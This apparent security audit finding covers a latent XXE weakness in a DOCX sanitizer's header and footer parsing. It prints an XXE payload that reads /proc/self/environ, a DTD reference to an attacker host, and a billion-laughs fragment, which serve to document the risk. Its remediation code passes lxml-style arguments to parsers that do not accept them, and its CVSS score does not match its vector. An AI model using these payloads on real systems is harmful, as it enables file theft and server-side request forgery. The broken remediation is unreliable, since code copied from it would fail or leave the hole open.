# Finding: XXE-Adjacent Risk in Python DOCX Sanitizer

## Severity
LOW (latent)

## CVSS Estimate
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L = 5.0 (latent — CPython 3.x does not expand external entities by default, so the practical XXE risk is low today; latent risk if a future maintainer switches to `lxml.etree.parse` or enables `resolve_entities`).

## Affected Code
- File: `ee/features/conversions/python/docx-sanitizer.py`
- Line: 145-147 (inside `_strip_numpages_fields`: `_register_all_namespaces(path)` then `tree = ET.parse(path)`), also at line 216-303 (`sanitize_docx`)
- Function: `_strip_numpages_fields`, `sanitize_docx`
- Endpoint: n/a — runs in a Trigger.dev task via `execFile("python3", docx-sanitizer.py, ...)` after a DOCX upload

## Description
`xml.etree.ElementTree.parse` does not expand external entities in CPython 3.x by default, so the practical XXE risk is low today. The file is, however, part of a security-sensitive sanitizer, and the XML payload inside a DOCX header/footer comes from the original document author — a hostile author who is also a Papermark user can plant `<!DOCTYPE … SYSTEM "…">`. The function also re-serializes the parsed XML back to disk (`tree.write(path, …)`), so any expanded-entity content gets re-persisted into the user's stored file.

The chain is: `UploadZone` → `tusServer.handle` → `onUploadFinish` → Trigger.dev → `execFile(python3, docx-sanitizer.py, …)` → unzipped DOCX → `ET.parse(word/header*.xml)`.

## Proof of Concept

### Pre-conditions (today, no practical exploit)
- CPython 3.x default config (no `resolve_entities=True`, no `lxml.etree.parse`).
- A hostile DOCX author (a Papermark user who is also the attacker) uploads a DOCX with `<!DOCTYPE foo SYSTEM "http://attacker.com/dtd">` in `word/header1.xml` or similar.

### Step-by-step exploitation (latent)
1. Attacker creates a DOCX with a header/footer containing:
   ```xml
   <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
   <!DOCTYPE foo [
     <!ENTITY xxe SYSTEM "file:///proc/self/environ">
   ]>
   <w:hdr xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
     <w:p><w:r><w:t>&xxe;</w:t></w:r></w:p>
   </w:hdr>
   ```
2. Attacker uploads the DOCX via the dataroom link upload flow.
3. The Trigger.dev task runs `python3 docx-sanitizer.py <path>` which calls `ET.parse(path)` and writes the result back to disk.
4. **Today (CPython 3.x default)**: `ET.parse` does not expand the `xxe` entity. The text remains literal `&xxe;` in the output. No exploit.
5. **Latent (if `lxml.etree.parse` is used or `resolve_entities=True` is set)**: the `xxe` entity is expanded, and the contents of `/proc/self/environ` are written into the DOCX. The attacker can read the file later by downloading the DOCX.

## Impact
- **Latent file read** — if the Python parser is changed to expand external entities, the attacker can read arbitrary files accessible to the papermark server process.
- **Latent SSRF** — if the parser also resolves network entities, the attacker can make the server fetch arbitrary URLs (including cloud metadata endpoints).
- **Latent DoS** — the billion-laughs attack (`<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;">...`) can be planted in the DOCX, causing the parser to expand exponentially and exhaust memory/CPU.

## Evidence
```python
# ee/features/conversions/python/docx-sanitizer.py:145-147
_register_all_namespaces(path)
tree = ET.parse(path)        # ← uses xml.etree.ElementTree (CPython 3.x default safe)
root = tree.getroot()
```

## Methodology
- **M2 — SAST** (`methodology-raw/02-synthesized-sast.md` S-004)
- **M1 — Reachability** (`methodology-raw/01-reachability-analysis.md` F4)

## Chain Potential
- None directly. The finding is a latent defense-in-depth concern.

## Remediation
Use `ET.iterparse(path, events=("start",), parser=ET.XMLParser(resolve_entities=False, no_network=True))` or switch the whole sanitizer to `defusedxml.ElementTree` (drop-in replacement, hardened against XXE by default):
```python
from defusedxml.ElementTree import parse, XMLParser

# Use a parser with all external-entity resolution disabled
parser = XMLParser(resolve_entities=False, no_network=True)
tree = parse(path, parser=parser)
```

Verify the same protection in `sanitize_docx` (lines 216-303). Add a regression test that uploads a DOCX with `<!DOCTYPE … SYSTEM "…">` in `word/header*.xml` and asserts that the entity is **not** expanded in the output.
